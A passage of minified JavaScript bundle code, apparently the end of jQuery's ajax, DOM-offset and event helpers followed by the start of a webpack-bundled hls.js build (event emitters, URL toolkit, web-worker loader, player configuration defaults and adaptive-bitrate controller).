"+o[0]])){!0===s?s=l[n]:!0!==l[n]&&(a=o[0],c.unshift(o[1]));break}if(!0!==s)if(s&&e.throws)t=s(t);else try{t=s(t)}catch(e){return{state:"parsererror",error:s?e:"No conversion from "+u+" to "+a}}}return{state:"success",data:t}}(p,M,E,l),l?(p.ifModified&&((T=E.getResponseHeader("Last-Modified"))&&(w.lastModified[n]=T),(T=E.getResponseHeader("etag"))&&(w.etag[n]=T)),204===e||"HEAD"===p.type?A="nocontent":304===e?A="notmodified":(A=M.state,f=M.data,l=!(h=M.error))):(h=A,!e&&A||(A="error",e<0&&(e=0))),E.status=e,E.statusText=(t||A)+"",l?v.resolveWith(g,[f,A,E]):v.rejectWith(g,[E,A,h]),E.statusCode(L),L=void 0,d&&y.trigger(l?"ajaxSuccess":"ajaxError",[E,p,l?f:h]),m.fireWith(g,[E,A]),d&&(y.trigger("ajaxComplete",[E,p]),--w.active||w.event.trigger("ajaxStop")))}return E},getJSON:function(e,t,r){return w.get(e,t,r,"json")},getScript:function(e,t){return w.get(e,void 0,t,"script")}}),w.each(["get","post"],function(e,t){w[t]=function(e,r,i,n){return m(r)&&(n=n||i,i=r,r=void 0),w.ajax(w.extend({url:e,type:t,dataType:n,data:r,success:i},w.isPlainObject(e)&&e))}}),w._evalUrl=function(e){return w.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,throws:!0})},w.fn.extend({wrapAll:function(e){var t;return this[0]&&(m(e)&&(e=e.call(this[0])),t=w(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){for(var e=this;e.firstElementChild;)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(e){return m(e)?this.each(function(t){w(this).wrapInner(e.call(this,t))}):this.each(function(){var t=w(this),r=t.contents();r.length?r.wrapAll(e):t.append(e)})},wrap:function(e){var t=m(e);return this.each(function(r){w(this).wrapAll(t?e.call(this,r):e)})},unwrap:function(e){return this.parent(e).not("body").each(function(){w(this).replaceWith(this.childNodes)}),this}}),w.expr.pseudos.hidden=function(e){return!w.expr.pseudos.visible(e)},w.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},w.ajaxSettings.xhr=function(){try{return new r.XMLHttpRequest}catch(e){}};var Gt={0:200,1223:204},Yt=w.ajaxSettings.xhr();v.cors=!!Yt&&"withCredentials"in Yt,v.ajax=Yt=!!Yt,w.ajaxTransport(function(e){var t,i;if(v.cors||Yt&&!e.crossDomain)return{send:function(n,a){var s,o=e.xhr();if(o.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(s in e.xhrFields)o[s]=e.xhrFields[s];for(s in e.mimeType&&o.overrideMimeType&&o.overrideMimeType(e.mimeType),e.crossDomain||n["X-Requested-With"]||(n["X-Requested-With"]="XMLHttpRequest"),n)o.setRequestHeader(s,n[s]);t=function(e){return function(){t&&(t=i=o.onload=o.onerror=o.onabort=o.ontimeout=o.onreadystatechange=null,"abort"===e?o.abort():"error"===e?"number"!=typeof o.status?a(0,"error"):a(o.status,o.statusText):a(Gt[o.status]||o.status,o.statusText,"text"!==(o.responseType||"text")||"string"!=typeof o.responseText?{binary:o.response}:{text:o.responseText},o.getAllResponseHeaders()))}},o.onload=t(),i=o.onerror=o.ontimeout=t("error"),void 0!==o.onabort?o.onabort=i:o.onreadystatechange=function(){4===o.readyState&&r.setTimeout(function(){t&&i()})},t=t("abort");try{o.send(e.hasContent&&e.data||null)}catch(e){if(t)throw e}},abort:function(){t&&t()}}}),w.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),w.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return w.globalEval(e),e}}}),w.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),w.ajaxTransport("script",function(e){var t,r;if(e.crossDomain)return{send:function(i,n){t=w("<script>").prop({charset:e.scriptCharset,src:e.url}).on("load error",r=function(e){t.remove(),r=null,e&&n("error"===e.type?404:200,e.type)}),s.head.appendChild(t[0])},abort:function(){r&&r()}}});var Qt,Ht=[],Kt=/(=)\?(?=&|$)|\?\?/;w.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Ht.pop()||w.expando+"_"+At++;return this[e]=!0,e}}),w.ajaxPrefilter("json jsonp",function(e,t,i){var n,a,s,o=!1!==e.jsonp&&(Kt.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Kt.test(e.data)&&"data");if(o||"jsonp"===e.dataTypes[0])return n=e.jsonpCallback=m(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,o?e[o]=e[o].replace(Kt,"$1"+n):!1!==e.jsonp&&(e.url+=(wt.test(e.url)?"&":"?")+e.jsonp+"="+n),e.converters["script json"]=function(){return s||w.error(n+" was not called"),s[0]},e.dataTypes[0]="json",a=r[n],r[n]=function(){s=arguments},i.always(function(){void 0===a?w(r).removeProp(n):r[n]=a,e[n]&&(e.jsonpCallback=t.jsonpCallback,Ht.push(n)),s&&m(a)&&a(s[0]),s=a=void 0}),"script"}),v.createHTMLDocument=((Qt=s.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===Qt.childNodes.length),w.parseHTML=function(e,t,r){return"string"!=typeof e?[]:("boolean"==typeof t&&(r=t,t=!1),t||(v.createHTMLDocument?((i=(t=s.implementation.createHTMLDocument("")).createElement("base")).href=s.location.href,t.head.appendChild(i)):t=s),a=!r&&[],(n=x.exec(e))?[t.createElement(n[1])]:(n=Te([e],t,a),a&&a.length&&w(a).remove(),w.merge([],n.childNodes)));var i,n,a},w.fn.load=function(e,t,r){var i,n,a,s=this,o=e.indexOf(" ");return o>-1&&(i=gt(e.slice(o)),e=e.slice(0,o)),m(t)?(r=t,t=void 0):t&&"object"==typeof t&&(n="POST"),s.length>0&&w.ajax({url:e,type:n||"GET",dataType:"html",data:t}).done(function(e){a=arguments,s.html(i?w("<div>").append(w.parseHTML(e)).find(i):e)}).always(r&&function(e,t){s.each(function(){r.apply(this,a||[e.responseText,t,e])})}),this},w.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){w.fn[t]=function(e){return this.on(t,e)}}),w.expr.pseudos.animated=function(e){return w.grep(w.timers,function(t){return e===t.elem}).length},w.offset={setOffset:function(e,t,r){var i,n,a,s,o,u,l=w.css(e,"position"),c=w(e),d={};"static"===l&&(e.style.position="relative"),o=c.offset(),a=w.css(e,"top"),u=w.css(e,"left"),("absolute"===l||"fixed"===l)&&(a+u).indexOf("auto")>-1?(s=(i=c.position()).top,n=i.left):(s=parseFloat(a)||0,n=parseFloat(u)||0),m(t)&&(t=t.call(e,r,w.extend({},o))),null!=t.top&&(d.top=t.top-o.top+s),null!=t.left&&(d.left=t.left-o.left+n),"using"in t?t.using.call(e,d):c.css(d)}},w.fn.extend({offset:function(e){if(arguments.length)return void 0===e?this:this.each(function(t){w.offset.setOffset(this,e,t)});var t,r,i=this[0];return i?i.getClientRects().length?(t=i.getBoundingClientRect(),r=i.ownerDocument.defaultView,{top:t.top+r.pageYOffset,left:t.left+r.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,r,i=this[0],n={top:0,left:0};if("fixed"===w.css(i,"position"))t=i.getBoundingClientRect();else{for(t=this.offset(),r=i.ownerDocument,e=i.offsetParent||r.documentElement;e&&(e===r.body||e===r.documentElement)&&"static"===w.css(e,"position");)e=e.parentNode;e&&e!==i&&1===e.nodeType&&((n=w(e).offset()).top+=w.css(e,"borderTopWidth",!0),n.left+=w.css(e,"borderLeftWidth",!0))}return{top:t.top-n.top-w.css(i,"marginTop",!0),left:t.left-n.left-w.css(i,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){for(var e=this.offsetParent;e&&"static"===w.css(e,"position");)e=e.offsetParent;return e||Ae})}}),w.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,t){var r="pageYOffset"===t;w.fn[e]=function(i){return H(this,function(e,i,n){var a;if(L(e)?a=e:9===e.nodeType&&(a=e.defaultView),void 0===n)return a?a[t]:e[i];a?a.scrollTo(r?a.pageXOffset:n,r?n:a.pageYOffset):e[i]=n},e,i,arguments.length)}}),w.each(["top","left"],function(e,t){w.cssHooks[t]=Qe(v.pixelPosition,function(e,r){if(r)return r=Ye(e,t),Ue.test(r)?w(e).position()[t]+"px":r})}),w.each({Height:"height",Width:"width"},function(e,t){w.each({padding:"inner"+e,content:t,"":"outer"+e},function(r,i){w.fn[i]=function(n,a){var s=arguments.length&&(r||"boolean"!=typeof n),o=r||(!0===n||!0===a?"margin":"border");return H(this,function(t,r,n){var a;return L(t)?0===i.indexOf("outer")?t["inner"+e]:t.document.documentElement["client"+e]:9===t.nodeType?(a=t.documentElement,Math.max(t.body["scroll"+e],a["scroll"+e],t.body["offset"+e],a["offset"+e],a["client"+e])):void 0===n?w.css(t,r,o):w.style(t,r,n,o)},t,s?n:void 0,s)}})}),w.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,t){w.fn[t]=function(e,r){return arguments.length>0?this.on(t,null,e,r):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,r){return this.on(e,null,t,r)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,r,i){return this.on(t,e,r,i)},undelegate:function(e,t,r){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",r)}}),w.proxy=function(e,t){var r,i,n;if("string"==typeof t&&(r=e[t],t=e,e=r),m(e))return i=u.call(arguments,2),(n=function(){return e.apply(t||this,i.concat(u.call(arguments)))}).guid=e.guid=e.guid||w.guid++,n},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=I,w.isFunction=m,w.isWindow=L,w.camelCase=q,w.type=A,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},void 0===(i=function(){return w}.apply(t,[]))||(e.exports=i);var Wt=r.jQuery,Vt=r.$;return w.noConflict=function(e){return r.$===w&&(r.$=Vt),e&&r.jQuery===w&&(r.jQuery=Wt),w},n||(r.jQuery=r.$=w),w})},function(e,t){var r;r=function(){return this}();try{r=r||new Function("return this")()}catch(e){"object"==typeof window&&(r=window)}e.exports=r},,,function(e,t,r){var i;"undefined"!=typeof window&&(i=function(){return function(e){var t={};function r(i){if(t[i])return t[i].exports;var n=t[i]={i:i,l:!1,exports:{}};return e[i].call(n.exports,n,n.exports,r),n.l=!0,n.exports}return r.m=e,r.c=t,r.d=function(e,t,i){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:i})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var i=Object.create(null);if(r.r(i),Object.defineProperty(i,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)r.d(i,n,function(t){return e[t]}.bind(null,n));return i},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="/dist/",r(r.s="./src/hls.js")}({"./node_modules/eventemitter3/index.js":function(e,t,r){"use strict";var i=Object.prototype.hasOwnProperty,n="~";function a(){}function s(e,t,r){this.fn=e,this.context=t,this.once=r||!1}function o(e,t,r,i,a){if("function"!=typeof r)throw new TypeError("The listener must be a function");var o=new s(r,i||e,a),u=n?n+t:t;return e._events[u]?e._events[u].fn?e._events[u]=[e._events[u],o]:e._events[u].push(o):(e._events[u]=o,e._eventsCount++),e}function u(e,t){0==--e._eventsCount?e._events=new a:delete e._events[t]}function l(){this._events=new a,this._eventsCount=0}Object.create&&(a.prototype=Object.create(null),(new a).__proto__||(n=!1)),l.prototype.eventNames=function(){var e,t,r=[];if(0===this._eventsCount)return r;for(t in e=this._events)i.call(e,t)&&r.push(n?t.slice(1):t);return Object.getOwnPropertySymbols?r.concat(Object.getOwnPropertySymbols(e)):r},l.prototype.listeners=function(e){var t=n?n+e:e,r=this._events[t];if(!r)return[];if(r.fn)return[r.fn];for(var i=0,a=r.length,s=new Array(a);i<a;i++)s[i]=r[i].fn;return s},l.prototype.listenerCount=function(e){var t=n?n+e:e,r=this._events[t];return r?r.fn?1:r.length:0},l.prototype.emit=function(e,t,r,i,a,s){var o=n?n+e:e;if(!this._events[o])return!1;var u,l,c=this._events[o],d=arguments.length;if(c.fn){switch(c.once&&this.removeListener(e,c.fn,void 0,!0),d){case 1:return c.fn.call(c.context),!0;case 2:return c.fn.call(c.context,t),!0;case 3:return c.fn.call(c.context,t,r),!0;case 4:return c.fn.call(c.context,t,r,i),!0;case 5:return c.fn.call(c.context,t,r,i,a),!0;case 6:return c.fn.call(c.context,t,r,i,a,s),!0}for(l=1,u=new Array(d-1);l<d;l++)u[l-1]=arguments[l];c.fn.apply(c.context,u)}else{var f,h=c.length;for(l=0;l<h;l++)switch(c[l].once&&this.removeListener(e,c[l].fn,void 0,!0),d){case 1:c[l].fn.call(c[l].context);break;case 2:c[l].fn.call(c[l].context,t);break;case 3:c[l].fn.call(c[l].context,t,r);break;case 4:c[l].fn.call(c[l].context,t,r,i);break;default:if(!u)for(f=1,u=new Array(d-1);f<d;f++)u[f-1]=arguments[f];c[l].fn.apply(c[l].context,u)}}return!0},l.prototype.on=function(e,t,r){return o(this,e,t,r,!1)},l.prototype.once=function(e,t,r){return o(this,e,t,r,!0)},l.prototype.removeListener=function(e,t,r,i){var a=n?n+e:e;if(!this._events[a])return this;if(!t)return u(this,a),this;var s=this._events[a];if(s.fn)s.fn!==t||i&&!s.once||r&&s.context!==r||u(this,a);else{for(var o=0,l=[],c=s.length;o<c;o++)(s[o].fn!==t||i&&!s[o].once||r&&s[o].context!==r)&&l.push(s[o]);l.length?this._events[a]=1===l.length?l[0]:l:u(this,a)}return this},l.prototype.removeAllListeners=function(e){var t;return e?(t=n?n+e:e,this._events[t]&&u(this,t)):(this._events=new a,this._eventsCount=0),this},l.prototype.off=l.prototype.removeListener,l.prototype.addListener=l.prototype.on,l.prefixed=n,l.EventEmitter=l,e.exports=l},"./node_modules/node-libs-browser/node_modules/events/events.js":function(e,t){function r(){this._events=this._events||{},this._maxListeners=this._maxListeners||void 0}function i(e){return"function"==typeof e}function n(e){return"object"==typeof e&&null!==e}function a(e){return void 0===e}e.exports=r,r.EventEmitter=r,r.prototype._events=void 0,r.prototype._maxListeners=void 0,r.defaultMaxListeners=10,r.prototype.setMaxListeners=function(e){if("number"!=typeof e||e<0||isNaN(e))throw TypeError("n must be a positive number");return this._maxListeners=e,this},r.prototype.emit=function(e){var t,r,s,o,u,l;if(this._events||(this._events={}),"error"===e&&(!this._events.error||n(this._events.error)&&!this._events.error.length)){if((t=arguments[1])instanceof Error)throw t;var c=new Error('Uncaught, unspecified "error" event. ('+t+")");throw c.context=t,c}if(a(r=this._events[e]))return!1;if(i(r))switch(arguments.length){case 1:r.call(this);break;case 2:r.call(this,arguments[1]);break;case 3:r.call(this,arguments[1],arguments[2]);break;default:o=Array.prototype.slice.call(arguments,1),r.apply(this,o)}else if(n(r))for(o=Array.prototype.slice.call(arguments,1),s=(l=r.slice()).length,u=0;u<s;u++)l[u].apply(this,o);return!0},r.prototype.addListener=function(e,t){var s;if(!i(t))throw TypeError("listener must be a function");return this._events||(this._events={}),this._events.newListener&&this.emit("newListener",e,i(t.listener)?t.listener:t),this._events[e]?n(this._events[e])?this._events[e].push(t):this._events[e]=[this._events[e],t]:this._events[e]=t,n(this._events[e])&&!this._events[e].warned&&(s=a(this._maxListeners)?r.defaultMaxListeners:this._maxListeners)&&s>0&&this._events[e].length>s&&(this._events[e].warned=!0,console.error("(node) warning: possible EventEmitter memory leak detected. %d listeners added. Use emitter.setMaxListeners() to increase limit.",this._events[e].length),"function"==typeof console.trace&&console.trace()),this},r.prototype.on=r.prototype.addListener,r.prototype.once=function(e,t){if(!i(t))throw TypeError("listener must be a function");var r=!1;function n(){this.removeListener(e,n),r||(r=!0,t.apply(this,arguments))}return n.listener=t,this.on(e,n),this},r.prototype.removeListener=function(e,t){var r,a,s,o;if(!i(t))throw TypeError("listener must be a function");if(!this._events||!this._events[e])return this;if(s=(r=this._events[e]).length,a=-1,r===t||i(r.listener)&&r.listener===t)delete this._events[e],this._events.removeListener&&this.emit("removeListener",e,t);else if(n(r)){for(o=s;o-- >0;)if(r[o]===t||r[o].listener&&r[o].listener===t){a=o;break}if(a<0)return this;1===r.length?(r.length=0,delete this._events[e]):r.splice(a,1),this._events.removeListener&&this.emit("removeListener",e,t)}return this},r.prototype.removeAllListeners=function(e){var t,r;if(!this._events)return this;if(!this._events.removeListener)return 0===arguments.length?this._events={}:this._events[e]&&delete this._events[e],this;if(0===arguments.length){for(t in this._events)"removeListener"!==t&&this.removeAllListeners(t);return this.removeAllListeners("removeListener"),this._events={},this}if(i(r=this._events[e]))this.removeListener(e,r);else if(r)for(;r.length;)this.removeListener(e,r[r.length-1]);return delete this._events[e],this},r.prototype.listeners=function(e){return this._events&&this._events[e]?i(this._events[e])?[this._events[e]]:this._events[e].slice():[]},r.prototype.listenerCount=function(e){if(this._events){var t=this._events[e];if(i(t))return 1;if(t)return t.length}return 0},r.listenerCount=function(e,t){return e.listenerCount(t)}},"./node_modules/url-toolkit/src/url-toolkit.js":function(e,t,r){var i,n,a,s,o;i=/^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/\?#]*\/)*.*?)??(;.*?)?(\?.*?)?(#.*?)?$/,n=/^([^\/?#]*)(.*)$/,a=/(?:\/|^)\.(?=\/)/g,s=/(?:\/|^)\.\.\/(?!\.\.\/).*?(?=\/)/g,o={buildAbsoluteURL:function(e,t,r){if(r=r||{},e=e.trim(),!(t=t.trim())){if(!r.alwaysNormalize)return e;var i=o.parseURL(e);if(!i)throw new Error("Error trying to parse base URL.");return i.path=o.normalizePath(i.path),o.buildURLFromParts(i)}var a=o.parseURL(t);if(!a)throw new Error("Error trying to parse relative URL.");if(a.scheme)return r.alwaysNormalize?(a.path=o.normalizePath(a.path),o.buildURLFromParts(a)):t;var s=o.parseURL(e);if(!s)throw new Error("Error trying to parse base URL.");if(!s.netLoc&&s.path&&"/"!==s.path[0]){var u=n.exec(s.path);s.netLoc=u[1],s.path=u[2]}s.netLoc&&!s.path&&(s.path="/");var l={scheme:s.scheme,netLoc:a.netLoc,path:null,params:a.params,query:a.query,fragment:a.fragment};if(!a.netLoc&&(l.netLoc=s.netLoc,"/"!==a.path[0]))if(a.path){var c=s.path,d=c.substring(0,c.lastIndexOf("/")+1)+a.path;l.path=o.normalizePath(d)}else l.path=s.path,a.params||(l.params=s.params,a.query||(l.query=s.query));return null===l.path&&(l.path=r.alwaysNormalize?o.normalizePath(a.path):a.path),o.buildURLFromParts(l)},parseURL:function(e){var t=i.exec(e);return t?{scheme:t[1]||"",netLoc:t[2]||"",path:t[3]||"",params:t[4]||"",query:t[5]||"",fragment:t[6]||""}:null},normalizePath:function(e){for(e=e.split("").reverse().join("").replace(a,"");e.length!==(e=e.replace(s,"")).length;);return e.split("").reverse().join("")},buildURLFromParts:function(e){return e.scheme+e.netLoc+e.path+e.params+e.query+e.fragment}},e.exports=o},"./node_modules/webworkify-webpack/index.js":function(e,t,r){function i(e){var t={};function r(i){if(t[i])return t[i].exports;var n=t[i]={i:i,l:!1,exports:{}};return e[i].call(n.exports,n,n.exports,r),n.l=!0,n.exports}r.m=e,r.c=t,r.i=function(e){return e},r.d=function(e,t,i){r.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:i})},r.r=function(e){Object.defineProperty(e,"__esModule",{value:!0})},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="/",r.oe=function(e){throw console.error(e),e};var i=r(r.s=ENTRY_MODULE);return i.default||i}var n="[\\.|\\-|\\+|\\w|/|@]+",a="\\((/\\*.*?\\*/)?s?.*?("+n+").*?\\)";function s(e){return(e+"").replace(/[.?*+^$[\]\\(){}|-]/g,"\\$&")}function o(e,t,i){var o={};o[i]=[];var u=t.toString(),l=u.match(/^function\s?\(\w+,\s*\w+,\s*(\w+)\)/);if(!l)return o;for(var c,d=l[1],f=new RegExp("(\\\\n|\\W)"+s(d)+a,"g");c=f.exec(u);)"dll-reference"!==c[3]&&o[i].push(c[3]);for(f=new RegExp("\\("+s(d)+'\\("(dll-reference\\s('+n+'))"\\)\\)'+a,"g");c=f.exec(u);)e[c[2]]||(o[i].push(c[1]),e[c[2]]=r(c[1]).m),o[c[2]]=o[c[2]]||[],o[c[2]].push(c[4]);for(var h,p=Object.keys(o),g=0;g<p.length;g++)for(var y=0;y<o[p[g]].length;y++)h=o[p[g]][y],isNaN(1*h)||(o[p[g]][y]=1*o[p[g]][y]);return o}function u(e){return Object.keys(e).reduce(function(t,r){return t||e[r].length>0},!1)}e.exports=function(e,t){t=t||{};var n={main:r.m},a=t.all?{main:Object.keys(n.main)}:function(e,t){for(var r={main:[t]},i={main:[]},n={main:{}};u(r);)for(var a=Object.keys(r),s=0;s<a.length;s++){var l=a[s],c=r[l].pop();if(n[l]=n[l]||{},!n[l][c]&&e[l][c]){n[l][c]=!0,i[l]=i[l]||[],i[l].push(c);for(var d=o(e,e[l][c],l),f=Object.keys(d),h=0;h<f.length;h++)r[f[h]]=r[f[h]]||[],r[f[h]]=r[f[h]].concat(d[f[h]])}}return i}(n,e),s="";Object.keys(a).filter(function(e){return"main"!==e}).forEach(function(e){for(var t=0;a[e][t];)t++;a[e].push(t),n[e][t]="(function(module, exports, __webpack_require__) { module.exports = __webpack_require__; })",s=s+"var "+e+" = ("+i.toString().replace("ENTRY_MODULE",JSON.stringify(t))+")({"+a[e].map(function(t){return JSON.stringify(t)+": "+n[e][t].toString()}).join(",")+"});\n"}),s=s+"new (("+i.toString().replace("ENTRY_MODULE",JSON.stringify(e))+")({"+a.main.map(function(e){return JSON.stringify(e)+": "+n.main[e].toString()}).join(",")+"}))(self);";var l=new window.Blob([s],{type:"text/javascript"});if(t.bare)return l;var c=(window.URL||window.webkitURL||window.mozURL||window.msURL).createObjectURL(l),d=new window.Worker(c);return d.objectURL=c,d}},"./src/config.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/controller/abr-controller.js"),n=r("./src/controller/buffer-controller.js"),a=r("./src/controller/cap-level-controller.js"),s=r("./src/controller/fps-controller.js"),o=r("./src/utils/xhr-loader.js"),u=r("./src/controller/audio-track-controller.js"),l=r("./src/controller/audio-stream-controller.js"),c=r("./src/utils/cues.js"),d=r("./src/controller/timeline-controller.js"),f=r("./src/controller/subtitle-track-controller.js"),h=r("./src/controller/subtitle-stream-controller.js"),p=r("./src/controller/eme-controller.js"),g=r("./src/utils/mediakeys-helper.js");t.hlsDefaultConfig={autoStartLoad:!0,startPosition:-1,defaultAudioCodec:void 0,debug:!1,capLevelOnFPSDrop:!1,capLevelToPlayerSize:!1,initialLiveManifestSize:1,maxBufferLength:30,maxBufferSize:6e7,maxBufferHole:.5,lowBufferWatchdogPeriod:.5,highBufferWatchdogPeriod:3,nudgeOffset:.1,nudgeMaxRetry:3,maxFragLookUpTolerance:.25,liveSyncDurationCount:3,liveMaxLatencyDurationCount:1/0,liveSyncDuration:void 0,liveMaxLatencyDuration:void 0,liveDurationInfinity:!1,liveBackBufferLength:1/0,maxMaxBufferLength:600,enableWorker:!0,enableSoftwareAES:!0,manifestLoadingTimeOut:1e4,manifestLoadingMaxRetry:1,manifestLoadingRetryDelay:1e3,manifestLoadingMaxRetryTimeout:64e3,startLevel:void 0,levelLoadingTimeOut:1e4,levelLoadingMaxRetry:4,levelLoadingRetryDelay:1e3,levelLoadingMaxRetryTimeout:64e3,fragLoadingTimeOut:2e4,fragLoadingMaxRetry:6,fragLoadingRetryDelay:1e3,fragLoadingMaxRetryTimeout:64e3,startFragPrefetch:!1,fpsDroppedMonitoringPeriod:5e3,fpsDroppedMonitoringThreshold:.2,appendErrorMaxRetry:3,loader:o.default,fLoader:void 0,pLoader:void 0,xhrSetup:void 0,licenseXhrSetup:void 0,abrController:i.default,bufferController:n.default,capLevelController:a.default,fpsController:s.default,stretchShortVideoTrack:!1,maxAudioFramesDrift:1,forceKeyFrameOnDiscontinuity:!0,abrEwmaFastLive:3,abrEwmaSlowLive:9,abrEwmaFastVoD:3,abrEwmaSlowVoD:9,abrEwmaDefaultEstimate:5e5,abrBandWidthFactor:.95,abrBandWidthUpFactor:.7,abrMaxWithRealBitrate:!1,maxStarvationDelay:4,maxLoadingDelay:4,minAutoBitrate:0,emeEnabled:!1,widevineLicenseUrl:void 0,requestMediaKeySystemAccessFunc:g.requestMediaKeySystemAccess},t.hlsDefaultConfig.subtitleStreamController=h.SubtitleStreamController,t.hlsDefaultConfig.subtitleTrackController=f.default,t.hlsDefaultConfig.timelineController=d.default,t.hlsDefaultConfig.cueHandler=c,t.hlsDefaultConfig.enableCEA708Captions=!0,t.hlsDefaultConfig.enableWebVTT=!0,t.hlsDefaultConfig.captionsTextTrack1Label="English",t.hlsDefaultConfig.captionsTextTrack1LanguageCode="en",t.hlsDefaultConfig.captionsTextTrack2Label="Spanish",t.hlsDefaultConfig.captionsTextTrack2LanguageCode="es",t.hlsDefaultConfig.audioStreamController=l.default,t.hlsDefaultConfig.audioTrackController=u.default,t.hlsDefaultConfig.emeController=p.default},"./src/controller/abr-controller.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/utils/buffer-helper.js"),u=r("./src/errors.js"),l=r("./src/utils/logger.js"),c=r("./src/utils/ewma-bandwidth-estimator.js"),d=window.performance,f=function(t){function r(e){var r=t.call(this,e,a.default.FRAG_LOADING,a.default.FRAG_LOADED,a.default.FRAG_BUFFERED,a.default.ERROR)||this;return r.lastLoadedFragLevel=0,r._nextAutoLevel=-1,r.hls=e,r.timer=null,r._bwEstimator=null,r.onCheck=r._abandonRulesCheck.bind(r),r}return n(r,t),r.prototype.destroy=function(){this.clearTimer(),s.default.prototype.destroy.call(this)},r.prototype.onFragLoading=function(e){var t=e.frag;if("main"===t.type&&(this.timer||(this.fragCurrent=t,this.timer=setInterval(this.onCheck,100)),!this._bwEstimator)){var r=this.hls,i=r.config,n=t.level,a=void 0,s=void 0;r.levels[n].details.live?(a=i.abrEwmaFastLive,s=i.abrEwmaSlowLive):(a=i.abrEwmaFastVoD,s=i.abrEwmaSlowVoD),this._bwEstimator=new c.default(r,s,a,i.abrEwmaDefaultEstimate)}},r.prototype._abandonRulesCheck=function(){var e=this.hls,t=e.media,r=this.fragCurrent;if(r){var i=r.loader,n=e.minAutoLevel;if(!i||i.stats&&i.stats.aborted)return l.logger.warn("frag loader destroy or aborted, disarm abandonRules"),this.clearTimer(),void(this._nextAutoLevel=-1);var s=i.stats;if(t&&s&&(!t.paused&&0!==t.playbackRate||!t.readyState)&&r.autoLevel&&r.level){var u=d.now()-s.trequest,c=Math.abs(t.playbackRate);if(u>500*r.duration/c){var f=e.levels,h=Math.max(1,s.bw?s.bw/8:1e3*s.loaded/u),p=f[r.level],g=p.realBitrate?Math.max(p.realBitrate,p.bitrate):p.bitrate,y=s.total?s.total:Math.max(s.loaded,Math.round(r.duration*g/8)),v=t.currentTime,m=(y-s.loaded)/h,L=(o.BufferHelper.bufferInfo(t,v,e.config.maxBufferHole).end-v)/c;if(L<2*r.duration/c&&m>L){var M=void 0,T=void 0;for(T=r.level-1;T>n;T--){var A=f[T].realBitrate?Math.max(f[T].realBitrate,f[T].bitrate):f[T].bitrate;if((M=r.duration*A/(6.4*h))<L)break}M<m&&(l.logger.warn("loading too slow, abort fragment loading and switch to level "+T+":fragLoadedDelay["+T+"]<fragLoadedDelay["+(r.level-1)+"];bufferStarvationDelay:"+M.toFixed(1)+"<"+m.toFixed(1)+":"+L.toFixed(1)),e.nextLoadLevel=T,this._bwEstimator.sample(u,s.loaded),i.abort(),this.clearTimer(),e.trigger(a.default.FRAG_LOAD_EMERGENCY_ABORTED,{frag:r,stats:s}))}}}}},r.prototype.onFragLoaded=function(t){var r=t.frag;if("main"===r.type&&e.isFinite(r.sn)){if(this.clearTimer(),this.lastLoadedFragLevel=r.level,this._nextAutoLevel=-1,this.hls.config.abrMaxWithRealBitrate){var i=this.hls.levels[r.level],n=(i.loaded?i.loaded.bytes:0)+t.stats.loaded,a=(i.loaded?i.loaded.duration:0)+t.frag.duration;i.loaded={bytes:n,duration:a},i.realBitrate=Math.round(8*n/a)}if(t.frag.bitrateTest){var s=t.stats;s.tparsed=s.tbuffered=s.tload,this.onFragBuffered(t)}}},r.prototype.onFragBuffered=function(t){var 